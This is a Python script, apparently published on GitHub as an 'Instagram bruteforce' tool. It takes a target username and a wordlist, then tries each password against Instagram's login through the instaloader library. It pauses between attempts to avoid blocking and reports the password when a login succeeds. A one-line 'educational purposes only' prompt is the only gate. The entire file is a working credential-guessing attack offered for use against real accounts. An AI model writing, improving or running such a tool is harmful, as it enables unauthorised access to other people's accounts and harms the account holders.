import instaloader
from getpass import getpass
import time
import subprocess as sub

clear = sub.call("clear")
clear
class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'

print(bcolors.OKBLUE+'''
 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄        ▄████  ██▀███   ▄▄▄       ███▄ ▄███▓   
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄     ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒   
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░   
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██    
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒   
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░ ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░   
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░   
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░ ░   ░   ░░   ░   ░   ▒   ░      ░      
 ░           ░       ░                 ░  ░      ░    ░           ░  ░       ░      bruteforce

https://github.com/redKatz
https://www.instagram.com/katz.py                                                                                    
'''
+bcolors.ENDC)
print(bcolors.WARNING+"\n\n𝙩𝙝𝙚 𝙖𝙪𝙩𝙝𝙤𝙧 𝙖𝙨𝙨𝙪𝙢𝙚𝙨 𝙣𝙤 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙞𝙗𝙞𝙡𝙞𝙩𝙮 𝙛𝙤𝙧 𝙝𝙤𝙬 𝙩𝙝𝙞𝙨 𝙘𝙤𝙣𝙩𝙚𝙣𝙩 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙪𝙨𝙚𝙙\n=======================================================================\n\n"+bcolors.ENDC)
sceltadisc = input("\n\nUse this content for educational purposes only? [yes/no]: ")
if sceltadisc == "yes":
    print("\n")
    clear
else:
    exit()
L = instaloader.Instaloader()
while True:
	USER = ""
	USER = input('\nEnter Instagram Username to bruteforce: ')
	wl = input("\nEnter world list name: ")
	sleepp = int(input("\nInsert sleep time for login"))
	sub.call("clear")
	procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
	if procedere == "y":
		break
	elif procedere == "modify":
		print("\nReturn...")
	elif procedere == "break":
		exit()



file1 = open(wl, 'r')
Lines = file1.readlines()
 
count = 0

# Strips the newline character
for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        time.sleep(sleepp)
        print(bcolors.WARNING+"\nTrying "+pstest+"..."+bcolors.ENDC)
        L.login(USER , PASSWORD)
        print(bcolors.OKGREEN+bcolors.UNDERLINE+bcolors.BOLD+"\nPassword found"+bcolors.ENDC+bcolors.OKGREEN+": "+bcolors.ENDC+pstest)
        break
    except instaloader.exceptions.BadCredentialsException:
    	pass
    	print(bcolors.FAIL+"Incorret password: "+pstest+bcolors.ENDC)
    except instaloader.exceptions.ConnectionException:
    	print(bcolors.FAIL+"\nInstagram has been blocked your ip addres."+bcolors.ENDC)
    	break
    except instaloader.exceptions.InvalidArgumentException:
    	print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)
